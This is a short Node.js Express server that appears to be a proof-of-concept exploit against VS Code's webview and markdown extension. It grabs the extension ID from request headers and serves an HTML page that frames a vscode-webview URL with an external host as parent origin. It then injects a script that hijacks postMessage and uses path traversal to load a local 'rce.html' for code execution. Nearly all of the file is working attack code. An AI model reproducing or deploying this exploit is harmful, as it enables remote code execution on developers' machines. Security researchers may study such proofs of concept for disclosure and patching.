const express = require('express')
const app = express()
const port = 3000

let extensionId


app.use('/stealID', function(req, res, next) {
  extensionId = req.headers.origin.split('/')[2];
  console.log("Middleware called")
  next();
});

app.get('/stealID', (req, res) => {
  console.log(extensionId)
  createHTML()
  res.send('ID stolen')
})


var publicUrl = "https://felineintelligentbytes.kacegi6947.repl.co"

function createHTML() {

  srcUrl = `vscode-webview://${extensionId}/index.html?id=${extensionId}&amp;swVersion=2&amp;extensionId=vscode.markdown-language-features&amp;platform=electron&amp;vscode-resource-base-authority=vscode-resource.vscode-webview.net&amp;parentOrigin=${publicUrl}`

  payload = `<script>window.top.frames[0].onmessage=a=>{console.log(a);try{loc=JSON.parse(a.data.args.state).resource,console.log(loc);pwn_loc=loc.replace('file:///','vscode-file://vscode-app/g:/Hack/Microsoft%20VS%20Code/resources/app/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F').replace('exploit.md','rce.html').replace(/[a-z]%3A/,'');location.href=pwn_loc;}catch(b){console.log(b)}},window.top.postMessage({target:'${extensionId}',channel:'do-reload'},'*')`
  
htmlPOC = `
<script>


function sendMessage(){
    //send post message to frame

    window.frames[0].postMessage({channel:"content",args:{contents:"${payload}",options:{allowScripts:true}}},"*");
}

setTimeout(function(){sendMessage()}, 3000);

<\/script>
<iframe src="${srcUrl}">
`
}


app.get('/exploit', (req, res) => {
  res.send(htmlPOC)
})

app.get('/', (req, res) => {
  res.send("testss")
})

app.listen(port, () => {
  console.log(`Example app listening on port ${port}`)
})
